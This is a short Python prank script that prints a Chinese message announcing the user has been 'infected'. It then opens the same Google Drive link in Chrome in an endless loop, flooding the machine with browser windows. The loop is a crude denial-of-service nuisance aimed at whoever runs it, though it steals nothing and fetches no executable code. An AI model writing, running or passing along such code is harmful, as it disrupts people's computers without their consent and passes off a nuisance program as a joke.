import webbrowser
print("你被夢幻小可中毒了!")
while True:
    urL='https://drive.google.com/file/d/1O9RAshKB0oW0lOdS-4PKrHITyycbTjsA/view?usp=sharing'#彩蛋
    chrome_path="C:\Program Files\Google\Chrome\Application\chrome.exe"
    webbrowser.register('chrome', None,webbrowser.BackgroundBrowser(chrome_path))
    webbrowser.get('chrome').open_new(urL)